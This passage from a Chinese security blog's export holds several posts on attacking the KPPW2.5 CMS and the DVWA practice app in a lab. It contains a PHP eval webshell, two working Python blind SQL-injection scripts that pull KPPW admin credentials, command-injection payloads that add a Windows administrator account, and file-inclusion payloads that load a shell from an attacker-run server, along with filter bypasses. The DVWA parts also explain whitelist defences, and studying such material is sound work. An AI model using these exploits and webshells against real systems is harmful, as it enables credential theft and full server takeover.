action=&quot;http://192.168.50.157/kppw25/index.php?do=ajax&amp;view=upload&amp;file_type=big&amp;filename=filename&quot;&gt; 请选择文件： &lt;br&gt; &lt;input name=&quot;filename&quot; type=&quot;file&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;上传文件&quot;&gt; &lt;/form&gt; 攻击者可在本地上传php一句话木马 Ra&lt;?php @eval($_POST[&apos;lawliet&apos;]);?&gt; 点击上传文件后相当于向192.168.50.157发送了一次上传文件的http请求，用burp抓包，将content-type改为jpg即可上传成功并返回webshell地址访问webshell地址即可远程执行命令，比如ifconfig查看ip，cat /etc/passwd查看敏感文件由于之前在安装的时候将kppw25目录下的文件降成了apache权限，所以导致有些root命令不能执行，比如cat /etc/shadow，所以就算攻击者真的拿下webshell也只是apache的权限，没有系统权限,除非利用系统漏洞提权为root","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web安全/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"http://yoursite.com/tags/漏洞利用/"}]},{"title":"KPPW2.5几处sql注入漏洞利用与exp编写","slug":"KPPW25sqli","date":"2018-01-11T06:10:02.466Z","updated":"2018-06-04T15:08:11.687Z","comments":true,"path":"2018/01/11/KPPW25sqli/","link":"","permalink":"http://yoursite.com/2018/01/11/KPPW25sqli/","excerpt":"KPPW2.5版本几处sql注入漏洞利用以及exp编写序这篇文章通过分析KPPW2.5版本的注入漏洞来学习代码审计，使用python编写exp利用脚本去利用该漏洞","text":"KPPW2.5版本几处sql注入漏洞利用以及exp编写序这篇文章通过分析KPPW2.5版本的注入漏洞来学习代码审计，使用python编写exp利用脚本去利用该漏洞 lamp环境搭建下载centos6.4镜像，在虚拟机里最小化安装centos，安装服务器版 为了下载更方便，使用国内163镜像的源，更新源 yum -y install wget mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.163.com/.help/CentOS6-Base-163.repo 安装apache服务 yum -y install httpd service httpd start service iptables stop 在浏览器输入虚拟机ip测试是否安装成功，安装成功会显示apache的界面，注意这里要关闭iptables，不然会被防火墙禁止访问80端口 安装mysql服务 yum -y install mysql mysql-server mysql-devel service mysqld start 安装后进入mysql终端，默认密码为空，给mysql设置密码 mysql -u root -p use mysql; update user set Password=PASSWORD(&quot;root&quot;) where USER=&apos;root&apos; service mysqld restart 安装php和一些常用的php扩展，kppw的安装要求php-gd库的扩展，否则不能安装 yum -y install php php-mysql yum search php yum -y install gd php-gd gd-devel php-xml php-common php-mbstring php-ldap php-pear php-xmlrpc php-imap php-mysqli service httpd restart 安装KPPW2.5用winSCP将kppw2.5的压缩包上传至centos并解压 cd /var/www/html mkdir kppw25 yum -y install unzip cd kppw25 unzip KPPW_GBK.zip 将kppw25以及其目录下的文件的用户及用户组改为apache，否则安装时会显示目录不可写 chown -R apache kppw25 chgrp -R apache kppw25 在浏览器地址栏输入 http://192.168.50.157/kppw25/install 进行安装 如果到安装第二步一直进入不了第三步，再安装一下gd库扩展，重启一下服务即可 yum -y install php-gd service httpd restart 如果不出意外的话会出现这个界面，安装的第三步我们输入mysql数据库的密码并且设置后台登陆密码点击提交，安装成功 对漏洞分析利用并编写expKPPW2.5版本曾爆出了特别多的sql注入漏洞，在这里选择几个注入漏洞来研究学习一下 注入点1 1.漏洞分析 文件/control/user/account_auth.php $arrAllowAuth = array(&apos;realname&apos;,&apos;enterprise&apos;,&apos;bank&apos;,&apos;mobile&apos;,&apos;email&apos;); if ($code&amp;&amp;in_array($code,$arrAllowAuth)) { $code or $code = $keys [&apos;0&apos;]; $code or kekezu::show_msg ( $_lang [&apos;param_error&apos;], &quot;index.php?do=auth&quot;, 3, &apos;&apos;, &apos;warning&apos; ); $auth_class = &quot;keke_auth_&quot; . $code . &quot;_class&quot;; $objAuth = new $auth_class ( $code ); $auth_item = $arrAllAuthItems [$code]; $auth_dir = $auth_item [&apos;auth_dir&apos;]; $arrAuthInfo = $objAuth-&gt;get_user_auth_info ( $gUid, 0, $intBankAid ); require S_ROOT . &quot;/auth/$code/control/index.php&quot;; require keke_tpl_class::template ( &apos;auth/&apos; . $code . &apos;/tpl/&apos; . $_K [&apos;template&apos;] . &apos;/&apos;.$step ); die; } else { $real_pass = keke_auth_fac_class::auth_check ( &apos;enterprise&apos;, $gUid ) or $real_pass = keke_auth_fac_class::auth_check ( &quot;realname&quot;, $gUid ); $arrHasAuthItem = keke_auth_fac_class::get_auth ( $gUserInfo ); $arrUserAuthInfo = $arrHasAuthItem [&apos;info&apos;]; } 仔细看看这里的： $arrAuthInfo = $objAuth-&gt;get_user_auth_info ( $gUid, 0, $intBankAid ); 这里的变量$intBankAid进入了函数get_user_auth_info函数 跟进函数get_user_auth_info 文件/lib/sys/keke_auth_base_class.php： public function get_user_auth_info($uid,$is_username=0,$show_id=&apos;&apos;){ $sql=&quot;select * from &quot;.TABLEPRE.$this-&gt;_auth_table_name; if($uid){ $is_username==&apos;0&apos; and $sql.=&quot; where uid = &apos;$uid&apos; &quot; or $sql.=&quot; where username = &apos;$uid&apos; &quot;; $show_id and $sql.=&quot; and &quot;.$this-&gt;_primary_key.&quot;=&quot;.$show_id; $sql .=&quot; order by $this-&gt;_primary_key desc&quot;; $data = db_factory::query($sql); if(sizeof($data)==1){ return $data[0]; }else{ return $data; } }else{ return array(); } } 接收到的变量$intBankAid——$show_id，然后$show_id进入$sql 整个过程中变量$intBankAid未过滤，最后进入$sql进入数据库，导致sql注入漏洞 2.漏洞证明首先注册一个账号，然后访问http://192.168.50.157/kppw25/index.php?do=user&amp;view=account&amp;op=auth&amp;code=bank&amp;step=step2&amp;intBankAid=147接下来要在银行认证中添加一个新账户，信息随便填，在这里是测试不需要真实信息，但是信息格式一定要正确添加完账户后在银行认证中点击立即认证认证完成后回到http://192.168.50.157/kppw25/index.php?do=user&amp;view=account&amp;op=auth&amp;code=bank&amp;step=step2&amp;intBankAid=147intBankAid存在盲注，盲注类型为基于bool的盲注，and 1=1与and 1=2返回的页面结果不一样，证明存在盲注用burp的comparer模块对返回结果做对比3.漏洞利用与exp编写证明了存在基于bool的逻辑判断盲注，我们可以在intBankAid参数后构造逻辑判断，根据页面的差别来判断数据库中的数据 mid函数为mysql的字符串截取函数，截取select+concat(username,password)+from+keke_witkey_member+limit+0,1的第一个字符，与CHAR(97)，也就是a字符进行比较，如果相等说明and后的逻辑为真返回正常页面，可以看出数据库查询结果的第一个字符为’a’ http://192.168.50.157/kppw25/index.php?do=user&amp;view=account&amp;op=auth&amp;code=bank&amp;step=step2&amp;intBankAid=147 and mid((select concat(username,password) from keke_witkey_member limit 0,1),1,1)=CHAR(97) 如果and后的逻辑判断为假，将返回不同的页面 http://192.168.50.157/kppw25/index.php?do=user&amp;view=account&amp;op=auth&amp;code=bank&amp;step=step2&amp;intBankAid=147 and mid((select concat(username,password) from keke_witkey_member limit 0,1),1,1)=CHAR(98) 由此可用python编写exp读取admin的用户名和密码，代码如下 #encoding:utf-8 #kppw2.5 base bool blind sqli import requests headers={ &apos;Cookie&apos;:&apos;PHPSESSID=8p38igtr7fvvvi25d28rrql740&apos; }#获取用户身份 payload=&quot;http://192.168.50.157/kppw25/index.php?do=user&amp;view=account&amp;op=auth&amp;code=bank&amp;step=step2&amp;intBankAid=147&quot; rtrue=requests.get(payload,headers=headers).content#向正确页面发起一次请求获取返回结果,相当于bool判断为真的返回页面 data=&quot;&quot; for i in range(1,38):#admin用户名和密码一共长为37 for j in range(33,128):#循环可显示字符的ascii码值 payload=&quot;http://192.168.50.157/kppw25/index.php?do=user&amp;view=account&amp;op=auth&amp;code=bank&amp;step=step2&amp;intBankAid=147 and mid((select concat(username,password) from keke_witkey_member limit 0,1),%d,1)=CHAR(%d)&quot;%(i,j) r=requests.get(payload,headers=headers).content if r==rtrue: data=data+chr(j) print data break 脚本跑出admin的用户名和密码，可以在解密网站解密注入点21.漏洞分析文件/control/pubgoods.php &lt;?php kekezu::check_login(); $strPageTitle = &apos;发布商品-&apos;.$_K [&apos;html_title&apos;]; $strPageKeyword = &apos;发布商品,&apos;.$_K [&apos;html_title&apos;]; $strPageDescription = $kekezu-&gt;_sys_config[&apos;index_seo_desc&apos;]; $id = intval($id); $step = strval(trim($step)); ...... $strUrl = &quot;index.php?do=pubgoods&amp;id=&quot;.$id; $_SESSION[&apos;spread&apos;] = &apos;index.php?do=pubgoods&apos;; require S_ROOT . &quot;/shop/&quot; . $arrModelInfo[&apos;model_dir&apos;] . &quot;/control/pub.php&quot;; 看最后两行，这里的$arrModelInfo[&#39;model_dir&#39;]可以为goods或者service 当$arrModelInfo[&#39;model_dir&#39;]为goods时，我们跟进文件： /shop/goods/control/pub.php &lt;?php defined ( &apos;IN_KEKE&apos; ) or exit ( &apos;Access Denied&apos; ); $stdCacheName = &apos;service_cache_&apos;.$id.&apos;_&apos; . substr ( md5 ( $gUid ), 0, 6 ); $objRelease = goods_release_class::get_instance ($id); $objRelease-&gt;get_service_obj ( $stdCacheName ); $arrPubInfo = $objRelease-&gt;_std_obj-&gt;_release_info; $arrConfig = $objRelease-&gt;_service_config; $arrPubInfo[&apos;indus_pid&apos;] and $arrAllIndustrys = CommonClass::getIndustryByPid($arrPubInfo[&apos;indus_pid&apos;],&apos;indus_id,indus_pid,indus_name&apos;); switch ($step) { case &apos;step1&apos;: ...... if($action == &apos;delete_image&apos;){ $strSql = sprintf(&quot;select file_id,file_name,save_name from %switkey_file where file_id in(%s)&quot;,TABLEPRE,$fileid); $arrFileInfo = db_factory::get_one($strSql); $resText = CommonClass::delFileByFileId($fileid); if($resText){ $array = explode(&apos;,&apos;, $arrPubInfo[&apos;file_ids&apos;]); $newArr = CommonClass::returnNewArr($arrFileInfo[&apos;save_name&apos;], $array); $_POST[&apos;file_ids&apos;] = implode(&quot;,&quot;, $newArr); $arrPubInfo and $_POST = array_merge ( $arrPubInfo, $_POST); $objRelease-&gt;save_service_obj ($_POST, $stdCacheName ); kekezu::echojson(&apos;删除成功&apos;,1,array(&apos;fileid&apos;=&gt;$fileid,&apos;save_name&apos;=&gt;$arrFileInfo[&apos;save_name&apos;]));die; } } if($action == &apos;delete_goodsfile&apos;){ $strSql = sprintf(&quot;select file_id,file_name,save_name from %switkey_file where file_id in(%s)&quot;,TABLEPRE,$fileid); $arrFileInfo = db_factory::get_one($strSql); $resText = CommonClass::delFileByFileId($fileid); 当action=delete_image，或者action=delete_goodsfile时，参数fileid都会进入sql语句，而且没有过滤，没有引号保护，最后导致sql注入 继续往下，参数fileid还进入了函数delFileByFileId，继续跟踪： 文件/lib/inc/CommonClass.php： public static function delFileByFileId($fileId){ $strSql = sprintf(&quot;select file_id,file_name,save_name from %switkey_file where file_id in(%s)&quot;,TABLEPRE,$fileId); $arrFileInfo = db_factory::get_one($strSql); $filename = S_ROOT.$arrFileInfo[&apos;save_name&apos;]; if(file_exists($filename)){ unlink($filename); } return db_factory::execute(&quot;delete from &quot;.TABLEPRE.&quot;witkey_file where file_id = &quot;.$fileId); } 这里的fileid同样进入了select和delete语句，都没有过滤处理和保护，导致两处注入 这里在delete时，可以删除用户发布的商品或者任务的图片已经文件，而且这里最后删除时只根据fileid删除，没有判断删除对象的用户属性，导致可以任意删除任意用户发布的文件，导致越权操作。 下面来看看文件/lib/inc/CommonClass.php，这是一个全局调用的函数 来看看有多少文件使用了/lib/inc/CommonClass.php中的这个delFileByFileId函数 可以看到这里一个有12个文件使用了这个delFileByFileId函数，我们再来找两个其他文件，看看是不是也没有处理传入delFileByFileId函数的fileid参数 第一个文件/control/taskhandle.php： case &apos;workover&apos;: if (isset($formhash)&amp;&amp;kekezu::submitcheck($formhash)){ $resText = $objTask-&gt;work_over($tarContent, $file_id,intval($modify)); if($resText === true){ kekezu::show_msg ( &apos;操作成功&apos;, &apos;index.php?do=task&amp;id=&apos;.$taskId, 3, NULL, &apos;ok&apos; ); }else{ kekezu::show_msg ( $resText, &apos;index.php?do=task&amp;id=&apos;.$taskId, 3, NULL, &apos;fail&apos; ); } } if($action == &apos;deleteFile&apos;){ $resText = CommonClass::delFileByFileId($fileid); if($resText){ kekezu::echojson(&apos;删除成功&apos;,1,array(&apos;fileid&apos;=&gt;$fileid));die; } } fileid在全文上下没有处理，这里进入函数delFileByFileId后，也会导致注入 其他的就不一一列出来了，都存在同样的问题 fileid没有处理，直接进入函数delFileByFileId，然后fileid进入select和delete语句，导致sql注入，并且存在越权删除任意用户文件的漏洞 2.漏洞证明 http://192.168.50.157/kppw25/index.php?do=pubgoods&amp;step=step1&amp;action=delete_image&amp;fileid=5566)+and+1=if(mid((select+concat(username,password)+from+keke_witkey_member+limit+0,1),1,1)=char(97),sleep(5),0)%23 来解释一下上面的payload，mid为mysql的字符串截取函数，截取select+concat(username,password)+from+keke_witkey_member+limit+0,1的第一个字符，与CHAR(97)，也就是a字符进行比较，如果相等就延时5s再响应页面，否则就立即响应页面，因为查询有延时可以判断数据库查询结果的第一个字符为’a’（admin）,所以请求会有10s的延时，这里会延迟10秒返回 因为这里的存在两处select，所以sleep(5)了两次根据延时注入用python编写exp可以将admin的用户名和密码注入出来，代码如下 #encoding:utf-8 #kppw2.5 base time blind sqli import requests import time headers={ &apos;Cookie&apos;:&apos;PHPSESSID=8p38igtr7fvvvi25d28rrql740&apos; }#获取用户身份 data=&quot;&quot; for i in range(1,38):#admin用户名和密码一共长为37 for j in range(33,128):#循环可显示字符的ascii码值 payload=&quot;http://192.168.50.157/kppw25/index.php?do=pubgoods&amp;step=step1&amp;action=delete_image&amp;fileid=5566) and 1=if(mid((select concat(username,password) from keke_witkey_member limit 0,1),%d,1)=CHAR(%d),sleep(5),0)&quot;%(i,j) payload=payload+&quot;%23&quot; starttime=time.time()#获取发起请求的时间 r=requests.get(payload,headers=headers) if time.time()-starttime&gt;5:#获取接收服务器响应的时间，如果存在延时，说明查询到了内容，将结果输出 data=data+chr(j) print data break 以上是KPPW2.5的两个注入点，还有很多注入点，注入手法和漏洞都大差不易 通过注入出的网站管理员密码，可以进入后台，进行下一步渗透 本文用到的实验代码KPPW2.5源码 链接：https://pan.baidu.com/s/1eTPzBBc 密码：xdr6","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web安全/"}],"tags":[{"name":"exp编写","slug":"exp编写","permalink":"http://yoursite.com/tags/exp编写/"}]},{"title":"dvwa Command Injection","slug":"DVWACommandInjection","date":"2017-12-26T08:01:13.787Z","updated":"2018-06-04T14:59:36.061Z","comments":true,"path":"2017/12/26/DVWACommandInjection/","link":"","permalink":"http://yoursite.com/2017/12/26/DVWACommandInjection/","excerpt":"dvwa命令执行漏洞命令执行漏洞由于代码使用了危险的函数并且过滤不严导致可以远程执行命令，属于十分高危的漏洞，甚至攻击者可以直接利用该漏洞拿下一整个服务器的最高权限，比较典型的有struts框架远程代码执行漏洞 来看dvwa，感觉例子并不是多好","text":"dvwa命令执行漏洞命令执行漏洞由于代码使用了危险的函数并且过滤不严导致可以远程执行命令，属于十分高危的漏洞，甚至攻击者可以直接利用该漏洞拿下一整个服务器的最高权限，比较典型的有struts框架远程代码执行漏洞 来看dvwa，感觉例子并不是多好 low级别代码如下 &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // Get input $target = $_REQUEST[ &apos;ip&apos; ]; // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; 可以看出没有任何防御，直接将我们提交的内容执行我们可以利用此漏洞新建一个管理员直接获取服务器最高权限 payload 创建用户 127.0.0.1&amp;&amp;net user lawliet lawliet /add 将其加到管理组 127.0.0.1&amp;&amp;net localgroup administrators lawliet /add 不出问题我们就成为了服务器的管理员，利用远程桌面连接，ctrl+r，输入mstsc，就可以进行远程服务器连接，拿下服务器权限 输入ip和用户名输入密码连接成功，以管理员身份进入服务器 medium级别代码如下 &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // Get input $target = $_REQUEST[ &apos;ip&apos; ]; // Set blacklist $substitutions = array( &apos;&amp;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; 过滤了&amp;&amp;和;，用&amp;连接即可执行命令，不再重复 high级别代码如下 &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // Get input $target = trim($_REQUEST[ &apos;ip&apos; ]); // Set blacklist $substitutions = array( &apos;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, &apos;| &apos; =&gt; &apos;&apos;, &apos;-&apos; =&gt; &apos;&apos;, &apos;$&apos; =&gt; &apos;&apos;, &apos;(&apos; =&gt; &apos;&apos;, &apos;)&apos; =&gt; &apos;&apos;, &apos;`&apos; =&gt; &apos;&apos;, &apos;||&apos; =&gt; &apos;&apos;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; 使用黑名单过滤，总会有落网之鱼，用|（前面有空格）连接即可绕过 impossible级别代码如下 &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $target = $_REQUEST[ &apos;ip&apos; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int&apos;s put the IP back together. $target = $octet[0] . &apos;.&apos; . $octet[1] . &apos;.&apos; . $octet[2] . &apos;.&apos; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } else { // Ops. Let the user name theres a mistake echo &apos;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&apos;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 可以看出用白名单的方式限制了输入内容只能为ip地址，防止了连接其他命令，预防了命令执行漏洞，再一次说明了白名单的安全性远高于黑名单","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web安全/"}],"tags":[{"name":"dvwa学习","slug":"dvwa学习","permalink":"http://yoursite.com/tags/dvwa学习/"}]},{"title":"dvwa File Inclusion","slug":"DVWAFileInclusion","date":"2017-12-26T06:46:15.714Z","updated":"2018-06-04T14:59:55.159Z","comments":true,"path":"2017/12/26/DVWAFileInclusion/","link":"","permalink":"http://yoursite.com/2017/12/26/DVWAFileInclusion/","excerpt":"dvwa文件包含漏洞文件包含漏洞程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。文件包含漏洞分为本地文件包含和远程文件包含，当php开启了allow_url_include时，将允许远程文件包含，为了研究文件包含,我们将allow_url_include打开，文件包含漏洞可以用来遍历目录文件，结合文件上传漏洞可以getshell，或者直接利用远程文件包含同样可以getshell","text":"dvwa文件包含漏洞文件包含漏洞程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。文件包含漏洞分为本地文件包含和远程文件包含，当php开启了allow_url_include时，将允许远程文件包含，为了研究文件包含,我们将allow_url_include打开，文件包含漏洞可以用来遍历目录文件，结合文件上传漏洞可以getshell，或者直接利用远程文件包含同样可以getshell 测试环境一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口，php.ini中allow_url_include为On一台win7,攻击者服务器，ip为192.168.50.155，用来远程文件包含 之前我们在文件上传漏洞中上传了图片马，我们利用文件包含漏洞去包含图片马，同样可以直接包含php一句话木马文件getshell，由于文件包含的特性，不管文件后缀名是什么，只要当中有php代码，都会当做php执行 low级别代码如下 &lt;?php // The page we wish to display $file = $_GET[ &apos;page&apos; ]; ?&gt; 可以看到没有任何过滤，我们可以直接利用本地文件包含包含之前的图片马 payload http://192.168.50.128:8080/DVWA-master/vulnerabilities/fi/?page=../../hackable/uploads/heishacker.jpg 同时可以远程文件包含，包含远程服务器上的shell.txt，里面写着一句话木马 payload http://192.168.50.128:8080/DVWA-master/vulnerabilities/fi/?page=http://192.168.50.155/shell.txt 这两种方式都可以getshell medium级别代码如下 &lt;?php // The page we wish to display $file = $_GET[ &apos;page&apos; ]; // Input validation $file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file ); $file = str_replace( array( &quot;../&quot;, &quot;..\\&quot;&quot; ), &quot;&quot;, $file ); ?&gt; 可以看出用str_replace将../,http://,https://都替换成了空，但是str_replace这种方法是极其不安全的，首先这个函数只会检查一次，其次代码没有判断大小写，下面是绕过的payload 本地包含绕过 http://192.168.50.128:8080/DVWA-master/vulnerabilities/fi/?page=..././..././hackable/uploads/heishacker.jpg 远程包含绕过 http://192.168.50.128:8080/DVWA-master/vulnerabilities/fi/?page=Http://192.168.50.155/shell.txt http://192.168.50.128:8080/DVWA-master/vulnerabilities/fi/?page=hthttp://tp://192.168.50.155/shell.txt high级别代码如下 &lt;?php // The page we wish to display $file = $_GET[ &apos;page&apos; ]; if(!function_exists(&apos;fnmatch&apos;)) { function fnmatch($pattern, $string) { return preg_match(&quot;#^&quot;.strtr(preg_quote($pattern, &apos;#&apos;), array(&apos;\\*&apos; =&gt; &apos;.*&apos;, &apos;\\?&apos; =&gt; &apos;.&apos;)).&quot;$#i&quot;, $string); } // end } // end if // Input validation if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) { // This isn&apos;t the page we want! echo &quot;ERROR: File not found!&quot;; exit; } ?&gt; 可以看出采用了白名单过滤，要求page后必须是以file开头的额，远程文件包含是不能使用了，我们可以用file协议包含图片马，同时要猜路径名，在文件上传中已经提到过，不在重复，可以看出白名单远比黑名单安全的多 impossible级别代码如下 &lt;?php // The page we wish to display $file = $_GET[ &apos;page&apos; ]; // Only allow include.php or file{1..3}.php if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) { // This isn&apos;t the page we want! echo &quot;ERROR: File not found!&quot;; exit; } ?&gt; 可以看出完全使用了白名单过滤，只要求允许的文件出现在page后，这种方式是最安全的，有效的防止了文件包含","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web安全/"}],"tags":[{"name":"dvwa学习","slug":"dvwa学习","permalink":"http://yoursite.com/tags/dvwa学习/"}]},{"title":"dvwa File Upload","slug":"DVWAFileUpload","date":"2017-12-25T09:59:14.364Z","updated":"2018-06-04T15:00:16.785Z","comments":true,"path":"2017/12/25/DVWAFileUpload/","link":"","permalink":"http://yoursite.com/2017/12/25/DVWAFileUpload/","excerpt":"dvwa文件上传文件上传文件上传漏洞是由于服务器对客户端上传的文件过滤不严导致恶意用户上传服务器可执行的web脚本语言，攻击者可以利用该漏洞获取网站的webshell，用菜刀连接进行提权等操作，攻击者可能利用此漏洞就能拿到服务器权限","text":"dvwa文件上传文件上传文件上传漏洞是由于服务器对客户端上传的文件过滤不严导致恶意用户上传服务器可执行的web脚本语言，攻击者可以利用该漏洞获取网站的webshell，用菜刀连接进行提权等操作，攻击者可能利用此漏洞就能拿到服务器权限 测试环境一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口 low级别代码如下 &lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) { // No echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } ?&gt; 在此之前先来了解一下php的$_FILES变量以及与php文件上传有关的知识 $_FILES数组内容如下: $_FILES[&apos;myFile&apos;][&apos;name&apos;] 客户端文件的原名称。 $_FILES[&apos;myFile&apos;][&apos;type&apos;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。 $_FILES[&apos;myFile&apos;][&apos;size&apos;] 已上传文件的大小，单位为字节。 $_FILES[&apos;myFile&apos;][&apos;tmp_name&apos;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。 $_FILES[&apos;myFile&apos;][&apos;error&apos;] 和该文件上传相关的错误代码。[&apos;error&apos;] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量) UPLOAD_ERR_OK 值：0; 没有错误发生，文件上传成功。 UPLOAD_ERR_INI_SIZE 值：1; 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。 UPLOAD_ERR_FORM_SIZE 值：2; 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。 UPLOAD_ERR_PARTIAL 值：3; 文件只有部分被上传。 UPLOAD_ERR_NO_FILE 值：4; 没有文件被上传。 值：5; 上传文件大小为0. 文件被上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。 下面我们来看php代码，可以看到服务器在接收到了用户上传的文件后没有任何检查便直接将文件用move_uploaded_file函数移动到了dvwa目录下的hackable/uploads/目录下 所以我们直接上传php一句话木马即可拿到网站webshellshell.php &lt;?php @eval($_POST[&apos;lawliet&apos;]);?&gt; 访问webshell地址，测试是否上传成功上传成功后得到webshell地址，用中国菜刀连接即可进行更进一步的渗透 medium级别代码如下 &lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // File information $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ]; $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; // Is it an image? if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) { // No echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // Invalid file echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; } } ?&gt; 可以看出服务器对$_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]变量，也就是上传文件的MIME 类型进行了检查，同时也对文件大小做了限制，但是文件的MIME 类型检查我们是可以通过修改文件上传http数据包绕过的 上传文件，burp抓包，发送至Repeater 将数据包里的Content-Type: application/octet-stream改为服务器允许的类型Content-Type: image/jpeg，就能拿到网站的webshell high级别代码如下 &lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // File information $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; 